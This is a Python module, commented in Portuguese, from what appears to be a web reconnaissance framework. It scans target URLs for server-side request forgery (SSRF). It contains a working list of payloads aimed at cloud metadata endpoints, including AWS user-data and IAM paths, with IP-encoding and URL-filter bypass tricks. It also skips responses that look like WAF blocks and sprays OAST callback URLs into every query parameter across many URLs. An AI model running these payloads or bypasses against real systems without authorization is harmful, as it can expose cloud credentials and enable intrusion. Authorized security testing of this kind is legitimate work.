#!/usr/bin/env python3
"""
Módulo SSRF Scanner — Utiliza SSRFmap, Interactsh e fallback nativo
V10.3: Adicionado fallback nativo com payloads de metadata cloud + bypass filters
"""
import json
import shutil
import subprocess
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error
from ..http_utils import format_http_request, format_http_response

# V10.3: Payloads nativos de metadata cloud + bypass
METADATA_PAYLOADS = [
    # AWS EC2 IMDSv1
    ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "hostname", "local-ipv4", "iam"]),
    ("http://169.254.169.254/latest/user-data", ["#!/", "cloud-init", "password", "secret"]),
    # AWS EC2 — Bypass decimal IP
    ("http://2852039166/latest/meta-data/", ["ami-id", "instance-id", "hostname"]),
    # AWS EC2 — Bypass IPv6
    ("http://[::ffff:a9fe:a9fe]/latest/meta-data/", ["ami-id", "instance-id"]),
    # AWS EC2 — Bypass DNS rebinding style
    ("http://169.254.169.254.nip.io/latest/meta-data/", ["ami-id", "instance-id"]),
    # GCP
    ("http://metadata.google.internal/computeMetadata/v1/project/project-id", ["project"]),
    ("http://169.254.169.254/computeMetadata/v1/project/project-id", ["project"]),
    # Azure
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["compute", "vmId", "location"]),
    # DigitalOcean
    ("http://169.254.169.254/metadata/v1.json", ["droplet_id", "hostname", "region"]),
    # Oracle Cloud
    ("http://169.254.169.254/opc/v1/instance/", ["availabilityDomain", "compartmentId"]),
    # Alibaba Cloud
    ("http://100.100.100.200/latest/meta-data/", ["instance-id", "hostname"]),
    # V11: Bypass payloads adicionais
    ("http://0x7f000001/latest/meta-data/", ["ami-id", "instance-id"]),      # Hex IP (127.0.0.1)
    ("http://0177.0.0.1/latest/meta-data/", ["ami-id", "instance-id"]),      # Octal IP
    ("http://[::]/latest/meta-data/", ["ami-id", "instance-id"]),            # IPv6 unspecified
]

# V10.3: Bypass payloads para filtros de URL
SSRF_BYPASS_WRAPPERS = [
    "{payload}",                         # Direto
    "{payload}%00",                      # Null byte
    "{payload}#",                        # Fragment
    "{payload}?.png",                    # Extension masking
]


def _test_ssrf_native(url: str, param_name: str) -> list:
    """V10.3: Teste SSRF nativo com payloads de metadata cloud."""
    import httpx
    import urllib.parse
    from core.config import DEFAULT_USER_AGENT, REQUEST_DELAY
    import time

    findings = []
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    if param_name not in qs:
        return findings

    # Baseline
    try:
        with httpx.Client(timeout=8, verify=False, follow_redirects=True) as client:
            baseline_resp = client.get(url, headers={"User-Agent": DEFAULT_USER_AGENT})
            baseline_body = baseline_resp.text.lower()
            baseline_len = len(baseline_resp.text)
    except Exception:
        return findings

    with httpx.Client(timeout=8, verify=False, follow_redirects=True) as client:
        for meta_url, markers in METADATA_PAYLOADS:
            for wrapper in SSRF_BYPASS_WRAPPERS:
                final_payload = wrapper.format(payload=meta_url)
                time.sleep(REQUEST_DELAY)

                test_qs = qs.copy()
                test_qs[param_name] = [final_payload]
                new_query = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(
                    (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment)
                )

                try:
                    resp = client.get(test_url, headers={"User-Agent": DEFAULT_USER_AGENT})

                    if resp.status_code in [403, 405, 429]:
                        continue

                    body = resp.text.lower()

                    # WAF/generic block filter
                    if any(ws in body for ws in ["cloudflare", "blocked", "access denied", "forbidden", "ddos"]):
                        continue

                    # Verificar se markers de metadata aparecem no body e NÃO no baseline
                    matched_markers = [m for m in markers if m.lower() in body and m.lower() not in baseline_body]

                    # Confirmação extra: body deve ser significativamente diferente do baseline
                    # V11: Threshold aumentado para 500 bytes (reduz FP de páginas dinâmicas)
                    if matched_markers and abs(len(resp.text) - baseline_len) > 500:
                        findings.append({
                            "url": url,
                            "test_url": test_url,
                            "parameter": param_name,
                            "type": "SSRF",
                            "severity": "CRITICAL",
                            "payload": final_payload,
                            "matched_markers": matched_markers,
                            "details": f"SSRF Nativo: Metadata cloud detectado no response ({', '.join(matched_markers)})",
                            "action": "Confirmar manualmente: acesse a URL e verifique se os dados de metadata são reais.",
                            "request_raw": format_http_request(resp.request),
                            "response_raw": format_http_response(resp),
                        })
                        return findings  # Um achado por parâmetro basta

                except Exception:
                    pass

    return findings


def run(context: dict):
    target = context.get("target")
    if not target:
        raise ValueError("Target required")

    info(
        f"\n🟧───────────────────────────────────────────────────────────🟧\n"
        f"   📡 {C.BOLD}{C.CYAN}SSRF SCANNER (V10.3 NATIVE FALLBACK){C.END}\n"
        f"   🎯 Alvo: {C.GREEN}{target}{C.END}\n"
        f"🟧───────────────────────────────────────────────────────────🟧\n"
    )

    outdir = ensure_outdir(target, "ssrf")
    results_file = outdir / "ssrf_results.json"
    
    # Busca pelas URLs filtradas com o GF Patterns no módulo `urls`
    urls_file = Path("output") / target / "urls" / "patterns" / "ssrf_ready.txt"
    if not urls_file.exists():
        urls_file = Path("output") / target / "urls" / "patterns" / "ssrf_urls.txt"
        
    if not urls_file.exists():
        warn("   [!] Arquivo de URLs pré-filtradas para SSRF não encontrado. Certifique-se de ter rodado o módulo 'urls' com GF/Qsreplace ativados.")
        results_file.write_text("[]")
        return [str(results_file)]
        
    urls = [l.strip() for l in urls_file.read_text().splitlines() if l.strip()]
    if not urls:
        warn("   [!] Nenhuma URL candidata a SSRF detectada nos patterns.")
        results_file.write_text("[]")
        return [str(results_file)]

    info(f"   📊 Testando {len(urls)} URLs injetáveis contra SSRF...")

    # Verificar binário SSRFmap
    ssrfmap = shutil.which("ssrfmap")
    
    deduped = []
    
    if ssrfmap:
        info(f"   [i] Orquestrando SSRFmap em background...")
        ssrfmap_out = outdir / "ssrfmap_raw.txt"
        
        def run_ssrfmap(url):
            try:
                proc = subprocess.run(
                    [ssrfmap, "-u", url, "--level", "1"],
                    capture_output=True, text=True, timeout=30
                )
                if proc.stdout and ("vulnerable" in proc.stdout.lower() or "is vulnerable" in proc.stdout.lower()):
                    return url
            except Exception:
                pass
            return None
            
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(run_ssrfmap, u): u for u in urls[:50]}
            for future in as_completed(futures):
                res = future.result()
                if res:
                    deduped.append({
                        "url": res,
                        "type": "SSRF Vulnerability",
                        "severity": "CRITICAL",
                        "details": "Detecção Ativa via SSRFmap",
                        "action": "Checar acesso a metadados do Cloud Provider ou AWS"
                    })
                    info(f"   🚨 {C.RED}SSRF Detectado:{C.END} {res}")
    else:
        warn("   [!] 'ssrfmap' não encontrado. Rodando testes nativos + OAST...")

        # =============================================
        # V10.3: FALLBACK NATIVO COM METADATA PAYLOADS
        # =============================================
        import httpx
        import urllib.parse
        from core.config import REQUEST_DELAY
        import time

        info(f"   🔬 Executando teste nativo com {len(METADATA_PAYLOADS)} payloads de metadata cloud...")

        # Extrair parâmetros de cada URL
        native_candidates = []
        for u in urls[:100]:
            parsed = urllib.parse.urlparse(u)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            for param in qs:
                native_candidates.append((u, param))

        native_candidates = list(set(native_candidates))[:80]
        info(f"   📋 {len(native_candidates)} parâmetros candidatos para teste nativo...")

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(_test_ssrf_native, u, p): (u, p) for u, p in native_candidates}
            for future in as_completed(futures):
                try:
                    res = future.result()
                    if res:
                        deduped.extend(res)
                        for f in res:
                            info(f"   🚨 {C.RED}SSRF NATIVO Detectado:{C.END} {f['url']} via '{f['parameter']}'")
                except Exception:
                    pass

        # =============================================
        # OAST VIA INTERACTSH (mantido do original)
        # =============================================
        interact_bin = shutil.which("interactsh-client")
        if interact_bin:
            info("   [i] Interactsh detectado! Subindo servidor OAST temporal...")
            log_json = outdir / "oast_logs.json"
            
            proc = subprocess.Popen([interact_bin, "-json", "-o", str(log_json)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            
            import os
            import fcntl
            import re
            if proc.stdout:
                fd = proc.stdout.fileno()
                fl = fcntl.fcntl(fd, fcntl.F_GETFL)
                fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)
            
            time.sleep(3)
            
            oast_url = None
            for _ in range(50):
                try:
                    line = proc.stdout.readline() if proc.stdout else ""
                except Exception:
                    line = ""
                    
                if not line: 
                    time.sleep(0.5)
                    continue
                
                match = re.search(r'([a-z0-9\-]+\.[a-z0-9\-]+\.[a-z]+)', line)
                if match and ("oast" in match.group() or "interact" in match.group() or "pingb" in match.group()):
                    oast_url = match.group()
                    break

            if oast_url:
                if not oast_url.startswith("http"):
                    oast_url = "http://" + oast_url
                    
                info(f"   [+] Sessão OAST criada com sucesso: {C.GREEN}{oast_url}{C.END}")
                
                injected_urls = set()
                for u in urls[:150]:
                    parsed = urllib.parse.urlparse(u)
                    if parsed.query:
                        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                        new_qs = "&".join([f"{k}={oast_url}" for k in qs])
                        injected_urls.add(urllib.parse.urlunparse(parsed._replace(query=new_qs)))
                
                info(f"   [+] Disparando {len(injected_urls)} cargas venenosas multi-thread...")

                def shoot(url):
                    from ..http_utils import throttle
                    throttle()
                    try: httpx.get(url, verify=False, timeout=5)
                    except Exception: pass
                    
                with ThreadPoolExecutor(max_workers=10) as executor:
                    for u in injected_urls:
                        executor.submit(shoot, u)
                        
                info("   [i] Aguardando 10 segundos por interações OAB/DNS Reversas...")
                time.sleep(10)
                
                proc.terminate()
                
                if log_json.exists():
                    try:
                        for entry_line in log_json.read_text(errors="ignore").splitlines():
                            if not entry_line.strip(): continue
                            entry = json.loads(entry_line)
                            
                            deduped.append({
                                "url": f"{entry.get('protocol', 'Unknown')} Interação Capturada",
                                "type": "SSRF / OAST Pingback",
                                "severity": "CRITICAL",
                                "details": f"Conexão do IP alvo: {entry.get('remote-address')} na porta {entry.get('remote-port', 'N/A')}",
                                "action": "Vulnerabilidade Confirmada! Realize SSRF Manual."
                            })
                            info(f"   🚨 {C.RED}Callback OAST Detectado de {entry.get('remote-address')}{C.END}")
                    except Exception as err:
                        error(f"   [-] Erro ao ler Logs do Interactsh: {err}")
            else:
                proc.terminate()
                warn("   [-] Não foi possível extrair a URL de Payload do Interactsh.")
        else:
            info("   [i] interactsh-client não instalado. Testes nativos já executados acima.")

    results_file.write_text(json.dumps(deduped, indent=2, ensure_ascii=False))
    
    # Salvar summary
    summary = {"urls_tested": len(urls), "findings": len(deduped), "status": "COMPLETED"}
    (outdir / "scan_summary.json").write_text(json.dumps(summary, indent=2))
    
    if deduped:
        success(f"💉 {len(deduped)} SSRFs detectados!")
    else:
        success("✅ Nenhum SSRF detectado.")
    
    return [str(results_file)]
